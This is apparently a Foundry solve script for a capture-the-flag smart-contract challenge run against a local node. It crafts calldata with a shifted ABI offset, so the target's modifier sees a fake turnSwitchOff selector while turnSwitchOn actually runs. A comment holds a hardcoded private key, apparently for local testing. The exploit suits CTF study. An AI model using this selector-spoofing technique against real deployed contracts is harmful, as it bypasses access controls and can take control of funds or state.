// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function flipSwitch(bytes memory _data) external;
    function switchOn() external view returns (bool);
}

contract SolveScript is Script {
    address public target = 0x6A358FD7B7700887b0cd974202CdF93208F793E2;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        
        console.log("Initial switch state:", ITarget(target).switchOn());

        bytes4 turnSwitchOnSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 turnSwitchOffSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        
        console.log("turnSwitchOn selector:");
        console.logBytes4(turnSwitchOnSelector);
        console.log("turnSwitchOff selector:");
        console.logBytes4(turnSwitchOffSelector);
        
        // Craft malicious calldata:
        // Position 0x00-0x03: flipSwitch selector (automatic)
        // Position 0x04-0x23: offset to _data = 0x60 (96 decimal)
        // Position 0x24-0x43: dummy data (32 bytes)
        // Position 0x44-0x47: turnSwitchOff selector (position 68, checked by modifier)
        // Position 0x48-0x5f: padding (24 bytes)
        // Position 0x60-0x7f: length of actual _data = 0x04
        // Position 0x80-0x83: turnSwitchOn selector (actual call data)
        
        bytes memory maliciousCalldata = abi.encodePacked(
            flipSwitchSelector,                    // 0x00-0x03: function selector
            uint256(0x60),                        // 0x04-0x23: offset to _data (96)
            bytes32(0),                           // 0x24-0x43: dummy data
            turnSwitchOffSelector,                // 0x44-0x47: fake selector for modifier check
            bytes28(0),                           // 0x48-0x5f: padding to align
            uint256(0x04),                        // 0x60-0x7f: length of real _data
            turnSwitchOnSelector                  // 0x80-0x83: real function selector
        );
        
        console.log("Crafted calldata:");
        console.logBytes(maliciousCalldata);
        console.log("Calldata length:", maliciousCalldata.length);
        
        // Send the crafted calldata directly
        (bool success,) = target.call(maliciousCalldata);
        require(success, "Attack failed");
        
        console.log("Final switch state:", ITarget(target).switchOn());
        console.log("Attack completed successfully!");
        
        vm.stopBroadcast();
    }
}
